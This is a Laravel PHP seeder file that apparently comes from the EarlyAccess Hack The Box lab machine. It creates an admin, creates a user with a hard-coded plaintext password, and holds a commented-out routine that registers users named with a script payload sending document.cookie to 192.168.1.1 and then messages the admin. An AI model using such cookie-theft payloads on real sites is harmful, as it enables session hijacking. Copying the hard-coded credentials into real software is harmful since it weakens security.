<?php

namespace Database\Seeders;

use App\Models\User;
use Illuminate\Database\Seeder;

class UserSeeder extends Seeder
{
    /**
     * Run the database seeds.
     *
     * @return void
     */
    public function run()
    {
        $this->create_admin();
        $this->create_user('chronos','chronos@earlyaccess.htb','pw4chronos@htb');

        // Test XSS by creating some XSS test users
        //$this->xss_test(100);
    }

    public function create_admin()
    {
        // Create admin users
        User::create([
            'name' => 'admin',
            'email' => 'admin@earlyaccess.htb',
            'password' => bcrypt(env('ADMIN_PW')),
            'role' => 'admin',
        ]);
    }

    public function create_user($name, $email, $password)
    {
        User::create([
            'name' => $name,
            'email' => $email,
            'password' => bcrypt($password),
        ]);
    }

    // Create test-xss users
    /*public function xss_test(int $amount)
    {
        $port = 1200;
        $amount = $port + $amount;
        // Create xss users
        while ($port <= $amount)
        {
            // Create user with xss payloads
            $this->create_user(
                '<script>document.location="http://192.168.1.1:' . $port . '/?cookie="+document.cookie;</script>',
                'user'. $port .'@earlyaccess.htb',
                bcrypt('P@ssw0rd')
            );
            $port++;
        }

        $this->send_to_admin();
    }

    public function send_to_admin()
    {
        // Send messages to admin
        $admin = User::where('name', 'admin')->first();
        foreach (User::all()->except($admin->id) as $user)
        {
            $user->sendMessage($admin->id, "Lorem ipsum", "Subject");
        }
    }*/
}
